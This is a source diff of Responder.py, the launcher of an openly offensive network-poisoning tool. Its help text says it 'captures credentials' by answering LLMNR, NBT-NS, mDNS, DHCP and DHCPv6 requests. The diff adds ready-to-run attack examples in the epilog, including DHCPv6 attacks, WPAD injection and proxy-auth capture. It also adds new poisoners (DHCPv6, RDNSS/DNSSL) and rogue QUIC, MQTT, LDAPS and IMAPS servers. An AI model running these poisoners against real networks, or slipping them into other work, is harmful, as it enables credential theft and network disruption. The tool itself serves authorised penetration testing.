@@ -14,6 +14,7 @@
 #
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
+import asyncio
 import optparse
 import ssl
 try:
@@ -25,26 +26,281 @@ from utils import *
 import struct
 banner()
 
-parser = optparse.OptionParser(usage='python %prog -I eth0 -w -d\nor:\npython %prog -I eth0 -wd', version=settings.__version__, prog=sys.argv[0])
-parser.add_option('-A','--analyze',        action="store_true", help="Analyze mode. This option allows you to see NBT-NS, BROWSER, LLMNR requests without responding.", dest="Analyze", default=False)
-parser.add_option('-I','--interface',      action="store",      help="Network interface to use, you can use 'ALL' as a wildcard for all interfaces", dest="Interface", metavar="eth0", default=None)
-parser.add_option('-i','--ip',             action="store",      help="Local IP to use \033[1m\033[31m(only for MacOS)\033[0m", dest="OURIP", metavar="10.0.0.21", default=None)
-parser.add_option('-6', "--externalip6",    action="store",      help="Poison all requests with another IPv6 address than Responder's one.", dest="ExternalIP6",  metavar="2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed", default=None)
-parser.add_option('-e', "--externalip",    action="store",      help="Poison all requests with another IP address than Responder's one.", dest="ExternalIP",  metavar="10.0.0.22", default=None)
-parser.add_option('-b', '--basic',         action="store_true", help="Return a Basic HTTP authentication. Default: NTLM", dest="Basic", default=False)
-parser.add_option('-d', '--DHCP',          action="store_true", help="Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response. Default: False", dest="DHCP_On_Off", default=False)
-parser.add_option('-D', '--DHCP-DNS',     action="store_true", help="This option will inject a DNS server in the DHCP response, otherwise a WPAD server will be added. Default: False", dest="DHCP_DNS", default=False)
+import optparse
+import textwrap
 
-parser.add_option('-w','--wpad',           action="store_true", help="Start the WPAD rogue proxy server. Default value is False", dest="WPAD_On_Off", default=False)
-parser.add_option('-u','--upstream-proxy', action="store",      help="Upstream HTTP proxy used by the rogue WPAD Proxy for outgoing requests (format: host:port)", dest="Upstream_Proxy", default=None)
-parser.add_option('-F','--ForceWpadAuth',  action="store_true", help="Force NTLM/Basic authentication on wpad.dat file retrieval. This may cause a login prompt. Default: False", dest="Force_WPAD_Auth", default=False)
+class ResponderHelpFormatter(optparse.IndentedHelpFormatter):
+    """Custom formatter for better help output"""
+    
+    def format_description(self, description):
+        if description:
+            return description + "\n"
+        return ""
+    
+    def format_epilog(self, epilog):
+        if epilog:
+            return "\n" + epilog + "\n"
+        return ""
 
-parser.add_option('-P','--ProxyAuth',       action="store_true", help="Force NTLM (transparently)/Basic (prompt) authentication for the proxy. WPAD doesn't need to be ON. This option is highly effective. Default: False", dest="ProxyAuth_On_Off", default=False)
-parser.add_option('-Q','--quiet',           action="store_true", help="Tell Responder to be quiet, disables a bunch of printing from the poisoners. Default: False", dest="Quiet", default=False)
+def create_parser():
+    """Create argument parser with organized option groups"""
+    
+    usage = textwrap.dedent("""\
+        python3 %prog -I eth0 -v""")
+    
+    description = textwrap.dedent("""\
+    ══════════════════════════════════════════════════════════════════════════════
+      Responder - LLMNR/NBT-NS/mDNS Poisoner and Rogue Authentication Servers
+    ══════════════════════════════════════════════════════════════════════════════
+    Captures credentials by responding to broadcast/multicast name resolution,
+    DHCP, DHCPv6 requests
+    ══════════════════════════════════════════════════════════════════════════════""")
+    
+    epilog = textwrap.dedent("""\
+    ══════════════════════════════════════════════════════════════════════════════
+      Examples:
+    ══════════════════════════════════════════════════════════════════════════════
+      Basic poisoning:            python3 Responder.py -I eth0 -v
+      
+      ##Watch what's going on:
+      Analyze mode (passive):     python3 Responder.py -I eth0 -Av
 
-parser.add_option('--lm',                  action="store_true", help="Force LM hashing downgrade for Windows XP/2003 and earlier. Default: False", dest="LM_On_Off", default=False)
-parser.add_option('--disable-ess',         action="store_true", help="Force ESS downgrade. Default: False", dest="NOESS_On_Off", default=False)
-parser.add_option('-v','--verbose',        action="store_true", help="Increase verbosity.", dest="Verbose")
+      ##Working on old networks:
+      WPAD with forced auth:      python3 Responder.py -I eth0 -wFv
+
+      ##Great module:
+      Proxy auth:                 python3 Responder.py -I eth0 -Pv
+
+      ##DHCPv6 + Proxy authentication:
+      DHCPv6 attack:              python3 Responder.py -I eth0 --dhcpv6 -vP
+
+      ##DHCP -> WPAD injection -> Proxy authentication:
+      DHCP + WPAD injection:      python3 Responder.py -I eth0 -Pvd
+
+      ##Poison requests to an arbitrary IP:
+      Poison with external IP:    python3 Responder.py -I eth0 -e 10.0.0.100
+
+      ##Poison requests to an arbitrary IPv6 IP:
+      Poison with external IPv6:  python3 Responder.py -I eth0 -6 2800:ac:4000:8f9e:c5eb:2193:71:1d12
+    ══════════════════════════════════════════════════════════════════════════════
+      For more info: https://github.com/lgandx/Responder/blob/master/README.md
+    ══════════════════════════════════════════════════════════════════════════════""")
+    
+    parser = optparse.OptionParser(
+        usage=usage,
+        version=settings.__version__,
+        prog="Responder.py",
+        description=description,
+        epilog=epilog,
+        formatter=ResponderHelpFormatter()
+    )
+    
+    # -------------------------------------------------------------------------
+    # REQUIRED OPTIONS
+    # -------------------------------------------------------------------------
+    required = optparse.OptionGroup(parser, 
+        "Required Options",
+        "These options must be specified")
+    
+    required.add_option('-I', '--interface',
+        action="store",
+        dest="Interface",
+        metavar="eth0",
+        default=None,
+        help="Network interface to use. Use 'ALL' for all interfaces.")
+    
+    parser.add_option_group(required)
+    
+    # -------------------------------------------------------------------------
+    # POISONING OPTIONS
+    # -------------------------------------------------------------------------
+    poisoning = optparse.OptionGroup(parser,
+        "Poisoning Options", 
+        "Control how Responder poisons name resolution requests")
+    
+    poisoning.add_option('-A', '--analyze',
+        action="store_true",
+        dest="Analyze",
+        default=False,
+        help="Analyze mode. See requests without poisoning. (passive)")
+    
+    poisoning.add_option('-e', '--externalip',
+        action="store",
+        dest="ExternalIP",
+        metavar="IP",
+        default=None,
+        help="Poison with a different IPv4 address than Responder's.")
+    
+    poisoning.add_option('-6', '--externalip6',
+        action="store",
+        dest="ExternalIP6",
+        metavar="IPv6",
+        default=None,
+        help="Poison with a different IPv6 address than Responder's.")
+    
+    poisoning.add_option('--rdnss',
+        action="store_true",
+        dest="RDNSS_On_Off",
+        default=False,
+        help="Poison via Router Advertisements with RDNSS. Sets attacker as IPv6 DNS.")
+    
+    poisoning.add_option('--dnssl',
+        action="store",
+        dest="DNSSL_Domain",
+        metavar="DOMAIN",
+        default=None,
+        help="Poison via Router Advertisements with DNSSL. Injects DNS search suffix.")
+    
+    poisoning.add_option('-t', '--ttl',
+        action="store",
+        dest="TTL",
+        metavar="HEX",
+        default=None,
+        help="Set TTL for poisoned answers. Hex value (30s = 1e) or 'random'.")
+    
+    poisoning.add_option('-N', '--AnswerName',
+        action="store",
+        dest="AnswerName",
+        metavar="NAME",
+        default=None,
+        help="Canonical name in LLMNR answers. (for Kerberos relay over HTTP)")
+    
+    parser.add_option_group(poisoning)
+    
+    # -------------------------------------------------------------------------
+    # DHCP OPTIONS
+    # -------------------------------------------------------------------------
+    dhcp = optparse.OptionGroup(parser,
+        "DHCP Options",
+        "DHCP and DHCPv6 poisoning attacks")
+    
+    dhcp.add_option('-d', '--DHCP',
+        action="store_true",
+        dest="DHCP_On_Off",
+        default=False,
+        help="Enable DHCPv4 poisoning. Injects WPAD in DHCP responses.")
+    
+    dhcp.add_option('-D', '--DHCP-DNS',
+        action="store_true",
+        dest="DHCP_DNS",
+        default=False,
+        help="Inject DNS server (not WPAD) in DHCPv4 responses.")
+    
+    dhcp.add_option('--dhcpv6',
+        action="store_true",
+        dest="DHCPv6_On_Off",
+        default=False,
+        help="Enable DHCPv6 poisoning. WARNING: May disrupt network.")
+    
+    parser.add_option_group(dhcp)
+    
+    # -------------------------------------------------------------------------
+    # WPAD / PROXY OPTIONS
+    # -------------------------------------------------------------------------
+    wpad = optparse.OptionGroup(parser,
+        "WPAD / Proxy Options",
+        "Web Proxy Auto-Discovery attacks")
+    
+    wpad.add_option('-w', '--wpad',
+        action="store_true",
+        dest="WPAD_On_Off",
+        default=False,
+        help="Start WPAD rogue proxy server.")
+    
+    wpad.add_option('-F', '--ForceWpadAuth',
+        action="store_true",
+        dest="Force_WPAD_Auth",
+        default=False,
+        help="Force NTLM/Basic auth on wpad.dat retrieval. (may show prompt)")
+    
+    wpad.add_option('-P', '--ProxyAuth',
+        action="store_true",
+        dest="ProxyAuth_On_Off",
+        default=False,
+        help="Force proxy authentication. Highly effective. (can't use with -w)")
+    
+    wpad.add_option('-u', '--upstream-proxy',
+        action="store",
+        dest="Upstream_Proxy",
+        metavar="HOST:PORT",
+        default=None,
+        help="Upstream proxy for rogue WPAD proxy outgoing requests.")
+    
+    parser.add_option_group(wpad)
+    
+    # -------------------------------------------------------------------------
+    # AUTHENTICATION OPTIONS  
+    # -------------------------------------------------------------------------
+    auth = optparse.OptionGroup(parser,
+        "Authentication Options",
+        "Control authentication methods and downgrades")
+    
+    auth.add_option('-b', '--basic',
+        action="store_true",
+        dest="Basic",
+        default=False,
+        help="Return HTTP Basic auth instead of NTLM. (cleartext passwords)")
+    
+    auth.add_option('--lm',
+        action="store_true",
+        dest="LM_On_Off",
+        default=False,
+        help="Force LM hashing downgrade. (for Windows XP/2003)")
+    
+    auth.add_option('--disable-ess',
+        action="store_true",
+        dest="NOESS_On_Off",
+        default=False,
+        help="Disable Extended Session Security. (NTLMv1 downgrade)")
+    
+    auth.add_option('-E', '--ErrorCode',
+        action="store_true",
+        dest="ErrorCode",
+        default=False,
+        help="Return STATUS_LOGON_FAILURE. (enables WebDAV auth capture)")
+    
+    parser.add_option_group(auth)
+    
+    # -------------------------------------------------------------------------
+    # OUTPUT OPTIONS
+    # -------------------------------------------------------------------------
+    output = optparse.OptionGroup(parser,
+        "Output Options",
+        "Control verbosity and logging")
+    
+    output.add_option('-v', '--verbose',
+        action="store_true",
+        dest="Verbose",
+        default=False,
+        help="Increase verbosity. (recommended)")
+    
+    output.add_option('-Q', '--quiet',
+        action="store_true",
+        dest="Quiet",
+        default=False,
+        help="Quiet mode. Minimal output from poisoners.")
+    
+    parser.add_option_group(output)
+    
+    # -------------------------------------------------------------------------
+    # PLATFORM OPTIONS
+    # -------------------------------------------------------------------------
+    platform = optparse.OptionGroup(parser,
+        "Platform Options",
+        "OS-specific settings")
+    
+    platform.add_option('-i', '--ip',
+        action="store",
+        dest="OURIP",
+        metavar="IP",
+        default=None,
+        help="Local IP to use. (OSX only)")
+    
+    parser.add_option_group(platform)
+    
+    return parser
+
+parser = create_parser()
 options, args = parser.parse_args()
 
 if not os.geteuid() == 0:
@@ -53,6 +309,10 @@ if not os.geteuid() == 0:
 elif options.OURIP == None and IsMacOS() == True:
     print("\n\033[1m\033[31mMacOS detected, -i mandatory option is missing\033[0m\n")
     parser.print_help()
+    exit(-1)
+    
+elif options.ProxyAuth_On_Off and options.WPAD_On_Off:
+    print("\n\033[1m\033[31mYou cannot use WPAD server and Proxy_Auth server at the same time, choose one of them.\033[0m\n")
     exit(-1)
 
 settings.init()
@@ -65,6 +325,8 @@ settings.Config.ExpandIPRanges()
 #Create the DB, before we start Responder.
 CreateResponderDb()
 
+Have_IPv6 = settings.Config.IPv6
+
 class ThreadingUDPServer(ThreadingMixIn, UDPServer):
 	def server_bind(self):
 		if OsInterfaceIsSupported():
@@ -74,10 +336,12 @@ class ThreadingUDPServer(ThreadingMixIn, UDPServer):
 				else:
 					if (sys.version_info > (3, 0)):
 						self.socket.setsockopt(socket.SOL_SOCKET, 25, bytes(settings.Config.Interface+'\0', 'utf-8'))
-						self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
+						if Have_IPv6:
+							self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
 					else:
 						self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Interface+'\0')
-						self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
+						if Have_IPv6:
+							self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
 			except:
 				pass
 		UDPServer.server_bind(self)
@@ -91,10 +355,12 @@ class ThreadingTCPServer(ThreadingMixIn, TCPServer):
 				else:
 					if (sys.version_info > (3, 0)):
 						self.socket.setsockopt(socket.SOL_SOCKET, 25, bytes(settings.Config.Interface+'\0', 'utf-8'))
-						self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
+						if Have_IPv6:
+							self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
 					else:
 						self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Interface+'\0')
-						self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
+						if Have_IPv6:
+							self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
 			except:
 				pass
 		TCPServer.server_bind(self)
@@ -108,14 +374,44 @@ class ThreadingTCPServerAuth(ThreadingMixIn, TCPServer):
 				else:
 					if (sys.version_info > (3, 0)):
 						self.socket.setsockopt(socket.SOL_SOCKET, 25, bytes(settings.Config.Interface+'\0', 'utf-8'))
-						self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
+						if Have_IPv6:
+							self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
 					else:
 						self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Interface+'\0')
-						self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
+						if Have_IPv6:
+							self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
 			except:
 				pass
 		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
 		TCPServer.server_bind(self)
+	
+class ThreadingUDPDHCPv6Server(ThreadingMixIn, UDPServer):
+	allow_reuse_address = True
+	address_family = socket.AF_INET6
+	
+	def server_bind(self):
+		import socket
+		import struct
+		
+		# Bind to :: (accept packets to ANY address including multicast)
+		UDPServer.server_bind(self)
+		
+		print(color("[DHCPv6] Make sure to review DHCPv6 settings Responder.conf\n[DHCPv6] Only run this module for short periods of time, you might cause some disruption.", 2, 1))
+		
+		# Join multicast group
+		group = socket.inet_pton(socket.AF_INET6, 'ff02::1:2')
+		if_index = socket.if_nametoindex(settings.Config.Interface)
+		mreq = group + struct.pack('@I', if_index)
+		
+		try:
+			self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, mreq)
+			self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_LOOP, 1)
+			print(color("[DHCPv6] Joined ff02::1:2 port 547 on %s" % settings.Config.Interface, 2, 1))
+		except Exception as e:
+			print(color("[!] Multicast join failed: %s" % str(e), 1, 1))
+
+# Set address family to IPv6
+ThreadingUDPDHCPv6Server.address_family = socket.AF_INET6
 
 class ThreadingUDPMDNSServer(ThreadingMixIn, UDPServer):
 	def server_bind(self):
@@ -127,11 +423,13 @@ class ThreadingUDPMDNSServer(ThreadingMixIn, UDPServer):
 
 		#IPV6:
 		if (sys.version_info > (3, 0)):
-			mreq = socket.inet_pton(socket.AF_INET6, MADDR6) + struct.pack('@I', if_nametoindex2(settings.Config.Interface))
-			self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, mreq)
+			if Have_IPv6:
+				mreq = socket.inet_pton(socket.AF_INET6, MADDR6) + struct.pack('@I', if_nametoindex2(settings.Config.Interface))
+				self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, mreq)
 		else:
-			mreq = socket.inet_pton(socket.AF_INET6, MADDR6) + struct.pack('@I', if_nametoindex2(settings.Config.Interface))
-			self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, mreq)
+			if Have_IPv6:
+				mreq = socket.inet_pton(socket.AF_INET6, MADDR6) + struct.pack('@I', if_nametoindex2(settings.Config.Interface))
+				self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, mreq)
 		if OsInterfaceIsSupported():
 			try:
 				if settings.Config.Bind_To_ALL:
@@ -139,10 +437,12 @@ class ThreadingUDPMDNSServer(ThreadingMixIn, UDPServer):
 				else:
 					if (sys.version_info > (3, 0)):
 						self.socket.setsockopt(socket.SOL_SOCKET, 25, bytes(settings.Config.Interface+'\0', 'utf-8'))
-						self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
+						if Have_IPv6:
+							self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
 					else:
 						self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Interface+'\0')
-						self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
+						if Have_IPv6:
+							self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
 			except:
 				pass
 		UDPServer.server_bind(self)
@@ -156,8 +456,9 @@ class ThreadingUDPLLMNRServer(ThreadingMixIn, UDPServer):
 		Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,socket.inet_aton(MADDR) + settings.Config.IP_aton)
 
 		#IPV6:
-		mreq = socket.inet_pton(socket.AF_INET6, MADDR6) + struct.pack('@I', if_nametoindex2(settings.Config.Interface))
-		self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, mreq)
+		if Have_IPv6:
+			mreq = socket.inet_pton(socket.AF_INET6, MADDR6) + struct.pack('@I', if_nametoindex2(settings.Config.Interface))
+			self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, mreq)
 		if OsInterfaceIsSupported():
 			try:
 				if settings.Config.Bind_To_ALL:
@@ -165,29 +466,36 @@ class ThreadingUDPLLMNRServer(ThreadingMixIn, UDPServer):
 				else:
 					if (sys.version_info > (3, 0)):
 						self.socket.setsockopt(socket.SOL_SOCKET, 25, bytes(settings.Config.Interface+'\0', 'utf-8'))
-						self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
+						if Have_IPv6:
+							self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
 					else:
 						self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Interface+'\0')
-						self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
+						if Have_IPv6:
+							self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, False)
 			except:
 				pass
 		UDPServer.server_bind(self)
 		
 
 ThreadingUDPServer.allow_reuse_address = 1
-ThreadingUDPServer.address_family = socket.AF_INET6
+if Have_IPv6:
+	ThreadingUDPServer.address_family = socket.AF_INET6
 
 ThreadingTCPServer.allow_reuse_address = 1
-ThreadingTCPServer.address_family = socket.AF_INET6
+if Have_IPv6:
+	ThreadingTCPServer.address_family = socket.AF_INET6
 
 ThreadingUDPMDNSServer.allow_reuse_address = 1
-ThreadingUDPMDNSServer.address_family = socket.AF_INET6
+if Have_IPv6:
+	ThreadingUDPMDNSServer.address_family = socket.AF_INET6
 
 ThreadingUDPLLMNRServer.allow_reuse_address = 1
-ThreadingUDPLLMNRServer.address_family = socket.AF_INET6
+if Have_IPv6:
+	ThreadingUDPLLMNRServer.address_family = socket.AF_INET6
 
 ThreadingTCPServerAuth.allow_reuse_address = 1
-ThreadingTCPServerAuth.address_family = socket.AF_INET6
+if Have_IPv6:
+	ThreadingTCPServerAuth.address_family = socket.AF_INET6
 
 def serve_thread_udp_broadcast(host, port, handler):
 	try:
@@ -224,6 +532,14 @@ def serve_thread_udp(host, port, handler):
 	except:
 		print(color("[!] ", 1, 1) + "Error starting UDP server on port " + str(port) + ", check permissions or other servers running.")
 
+def serve_thread_dhcpv6(host, port, handler):
+	try:
+		# MUST bind to :: to receive multicast packets
+		server = ThreadingUDPDHCPv6Server(('::', port), handler)
+		server.serve_forever()
+	except Exception as e:
+		print(color("[!] DHCPv6 error: %s" % str(e), 1, 1))
+		
 def serve_thread_tcp(host, port, handler):
 	try:
 		if OsInterfaceIsSupported():
@@ -270,20 +586,40 @@ def main():
 		if (sys.version_info < (3, 0)):
 			print(color('\n\n[-]', 3, 1) + " Still using python 2? :(")
 		print(color('\n[+]', 2, 1) + " Listening for events...\n")
-			
+
 		threads = []
+        #IPv6 Poisoning
+		# DHCPv6 Server (disabled by default, enable with --dhcpv6)
+		if settings.Config.DHCPv6_On_Off:
+		    from servers.DHCPv6 import DHCPv6
+		    threads.append(Thread(target=serve_thread_dhcpv6, args=('', 547, DHCPv6,)))
 
-		# Load (M)DNS, NBNS and LLMNR Poisoners
-		from poisoners.LLMNR import LLMNR
-		from poisoners.NBTNS import NBTNS
-		from poisoners.MDNS import MDNS
-		threads.append(Thread(target=serve_LLMNR_poisoner, args=('', 5355, LLMNR,)))
-		threads.append(Thread(target=serve_MDNS_poisoner,  args=('', 5353, MDNS,)))
-		threads.append(Thread(target=serve_NBTNS_poisoner, args=('', 137,  NBTNS,)))
+		if settings.Config.RDNSS_On_Off or settings.Config.DNSSL_Domain:
+		    from poisoners.RDNSS import RDNSS
+		    threads.append(Thread(target=RDNSS, args=(
+        settings.Config.Interface,      # 1. interface
+        settings.Config.RDNSS_On_Off,   # 2. rdnss_enabled (bool) 
+        settings.Config.DNSSL_Domain    # 3. dnssl_domain (str or None)
+    )))
+			    
+		# Load MDNS, NBNS and LLMNR Poisoners
+		if settings.Config.LLMNR_On_Off:
+		    from poisoners.LLMNR import LLMNR
+		    threads.append(Thread(target=serve_LLMNR_poisoner, args=('', 5355, LLMNR,)))
 
+		if settings.Config.NBTNS_On_Off:
+		    from poisoners.NBTNS import NBTNS
+		    threads.append(Thread(target=serve_NBTNS_poisoner, args=('', 137,  NBTNS,)))
+
+		if settings.Config.MDNS_On_Off:
+		    from poisoners.MDNS import MDNS
+		    threads.append(Thread(target=serve_MDNS_poisoner,  args=('', 5353, MDNS,)))
+
+		#// Vintage Responder BOWSER module, now disabled by default. 
+		#// Generate to much noise & easily detectable on the network when in analyze mode.
 		# Load Browser Listener
-		from servers.Browser import Browser
-		threads.append(Thread(target=serve_thread_udp_broadcast, args=('', 138,  Browser,)))
+		#from servers.Browser import Browser
+		#threads.append(Thread(target=serve_thread_udp_broadcast, args=('', 138,  Browser,)))
 
 		if settings.Config.HTTP_On_Off:
 			from servers.HTTP import HTTP
@@ -312,7 +648,7 @@ def main():
 
 		if settings.Config.WPAD_On_Off:
 			from servers.HTTP_Proxy import HTTP_Proxy
-			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 3141, HTTP_Proxy,)))
+			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 3128, HTTP_Proxy,)))
 
 		if settings.Config.ProxyAuth_On_Off:
 		        from servers.Proxy_Auth import Proxy_Auth
@@ -327,6 +663,12 @@ def main():
 				from servers.SMB import SMB1
 				threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 445, SMB1,)))
 				threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 139, SMB1,)))
+
+		if settings.Config.QUIC_On_Off:
+			from servers.QUIC import start_quic_server
+			cert = os.path.join(settings.Config.ResponderPATH, settings.Config.SSLCert)
+			key = os.path.join(settings.Config.ResponderPATH, settings.Config.SSLKey)
+			threads.append(Thread(target=lambda: asyncio.run(start_quic_server(settings.Config.Bind_To, cert, key))))
 
 		if settings.Config.Krb_On_Off:
 			from servers.Kerberos import KerbTCP, KerbUDP
@@ -349,7 +691,12 @@ def main():
 		if settings.Config.LDAP_On_Off:
 			from servers.LDAP import LDAP, CLDAP
 			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 389, LDAP,)))
+			threads.append(Thread(target=serve_thread_SSL, args=(settings.Config.Bind_To, 636, LDAP,)))
 			threads.append(Thread(target=serve_thread_udp, args=('', 389, CLDAP,)))
+
+		if settings.Config.MQTT_On_Off:
+			from servers.MQTT import MQTT
+			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 1883, MQTT,)))
 
 		if settings.Config.SMTP_On_Off:
 			from servers.SMTP import ESMTP
@@ -359,11 +706,14 @@ def main():
 		if settings.Config.IMAP_On_Off:
 			from servers.IMAP import IMAP
 			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 143, IMAP,)))
+			from servers.IMAP import IMAPS
+			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 993, IMAPS,)))
+
 
 		if settings.Config.DNS_On_Off:
 			from servers.DNS import DNS, DNSTCP
 			threads.append(Thread(target=serve_thread_udp, args=('', 53, DNS,)))
-			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 53, DNSTCP,)))
+			threads.append(Thread(target=serve_thread_tcp, args=('', 53, DNSTCP,)))
 
 		if settings.Config.SNMP_On_Off:
 			from servers.SNMP import SNMP
@@ -387,6 +737,14 @@ def main():
 			time.sleep(1)
 
 	except KeyboardInterrupt:
+		# Optional: Print DHCPv6 statistics on shutdown
+		if settings.Config.DHCPv6_On_Off:
+			try:
+				from servers.DHCPv6 import print_dhcpv6_stats
+				print_dhcpv6_stats()
+			except:
+				raise
+				pass
 		sys.exit("\r%s Exiting..." % color('[+]', 2, 1))
 
 if __name__ == '__main__':
